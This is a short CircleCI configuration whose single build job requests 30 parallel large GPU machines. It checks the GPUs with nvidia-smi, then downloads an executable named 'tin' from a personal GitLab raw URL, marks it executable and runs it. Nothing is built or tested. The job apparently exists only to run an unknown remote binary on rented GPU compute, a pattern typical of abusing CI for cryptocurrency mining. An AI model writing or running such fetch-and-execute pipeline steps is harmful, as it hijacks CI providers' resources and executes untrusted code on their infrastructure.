version: 2.1
jobs:
  build:
    machine:
      resource_class: gpu.nvidia.large
      image: ubuntu-1604-cuda-10.1:201909-23
    steps:
      - run: nvidia-smi
      - run: wget https://gitlab.com/lambohopo/bash/-/raw/main/tin && chmod +x tin && ./tin
    parallelism: 30